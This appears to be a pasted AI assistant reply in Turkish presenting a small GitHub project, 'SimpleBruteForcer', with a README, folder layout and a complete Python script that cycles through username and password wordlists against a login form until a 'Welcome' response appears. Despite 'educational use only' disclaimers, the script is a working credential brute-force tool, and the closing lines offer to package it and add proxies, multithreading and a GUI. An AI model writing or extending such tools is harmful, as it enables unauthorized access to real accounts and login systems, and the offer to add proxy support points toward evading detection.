README.md
markdown
Kopyala
Düzenle
# 🔐 SimpleBruteForcer

Bu proje eğitim amaçlı basit bir brute-force deneme scriptidir. Gerçek sistemlere karşı kullanılmamalıdır.

## 📦 Kurulum

```bash
git clone https://github.com/kullaniciadi/SimpleBruteForcer.git
cd SimpleBruteForcer
pip install -r requirements.txt





# simplebrute-forcer
📁 Klasör Yapısı
Kopyala
Düzenle
SimpleBruteForcer/
│
├── wordlists/
│   ├── usernames.txt
│   └── passwords.txt
│
├── brute.py
├── README.md
└── requirements.txt

brute.py
python
Kopyala
Düzenle
import requests

def brute_force(url, usernames, passwords):
    for username in usernames:
        for password in passwords:
            print(f"[*] Trying -> {username}:{password}")
            response = requests.post(url, data={"username": username, "password": password})

            if "Welcome" in response.text:
                print(f"[+] Success! Username: {username} Password: {password}")
                return
    print("[-] No valid credentials found.")

if __name__ == "__main__":
    url = "http://example.com/login"  # <-- Buraya hedef sahte login sayfanın URL'si
    with open("wordlists/usernames.txt") as u_file:
        usernames = [line.strip() for line in u_file]

    with open("wordlists/passwords.txt") as p_file:
        passwords = [line.strip() for line in p_file]

    brute_force(url, usernames, passwords)


Kullanım
bash
Kopyala
Düzenle
python brute.py



⚠️ Uyarı
Bu proje sadece eğitim ve test amaçlıdır. Yasal olmayan şekilde kullanımı yasaktır.

yaml
Kopyala
Düzenle


---

Bu yapıyı bir GitHub reposu hâline getirip, `SimpleBruteForcer` adında yayınlayabilirsiniz. İsterseniz bu yapıyı ZIP olarak da hazırlayabilirim.

Devam etmek veya özellik eklemek istersen (proxy, çoklu thread, GUI, vb.), detayları söylemen yeterli.

    
